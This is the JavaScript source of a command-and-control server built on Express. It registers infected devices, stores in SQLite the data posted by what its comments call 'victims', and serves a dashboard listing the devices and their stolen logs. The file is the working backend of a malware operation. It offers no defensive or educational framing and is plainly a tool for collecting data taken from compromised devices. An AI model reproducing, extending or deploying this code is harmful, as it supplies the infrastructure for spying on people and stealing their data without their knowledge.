const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');

const app = express();
const PORT = 3000;

app.use(express.json());
app.use(express.static('public'));

// Create SQLite database
const db = new sqlite3.Database('c2.db');

db.run(`CREATE TABLE IF NOT EXISTS devices (
    id TEXT PRIMARY KEY,
    device_model TEXT,
    first_seen INTEGER,
    last_seen INTEGER,
    status TEXT
)`);

db.run(`CREATE TABLE IF NOT EXISTS logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT,
    type TEXT,
    data TEXT,
    timestamp INTEGER
)`);

// API endpoint for device registration
app.post('/api/register', (req, res) => {
    const { device_id, device_model } = req.body;
    const now = Date.now();
    
    db.run(`INSERT OR REPLACE INTO devices (id, device_model, first_seen, last_seen, status)
            VALUES (?, ?, ?, ?, 'online')`, [device_id, device_model, now, now]);
    
    res.json({ status: 'registered' });
});

// API endpoint for receiving data from victims
app.post('/api/data', (req, res) => {
    const { device_id, type, data } = req.body;
    
    db.run(`INSERT INTO logs (device_id, type, data, timestamp) VALUES (?, ?, ?, ?)`,
        [device_id, type, data, Date.now()]);
    
    db.run(`UPDATE devices SET last_seen = ? WHERE id = ?`, [Date.now(), device_id]);
    
    res.json({ status: 'received' });
});

// API endpoint to get all devices
app.get('/api/devices', (req, res) => {
    db.all(`SELECT * FROM devices ORDER BY last_seen DESC`, (err, rows) => {
        res.json({ devices: rows });
    });
});

// API endpoint to get all logs
app.get('/api/logs/all', (req, res) => {
    db.all(`SELECT * FROM logs ORDER BY timestamp DESC LIMIT 100`, (err, rows) => {
        res.json({ logs: rows });
    });
});

// API endpoint to get logs for a specific device
app.get('/api/logs/:device_id', (req, res) => {
    const device_id = req.params.device_id;
    db.all(`SELECT * FROM logs WHERE device_id = ? ORDER BY timestamp DESC LIMIT 100`,
        [device_id], (err, rows) => {
            res.json({ logs: rows });
        });
});

// Serve dashboard
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => {
    console.log(`C2 Server running on http://localhost:${PORT}`);
    console.log(`Dashboard: http://localhost:${PORT}`);
});
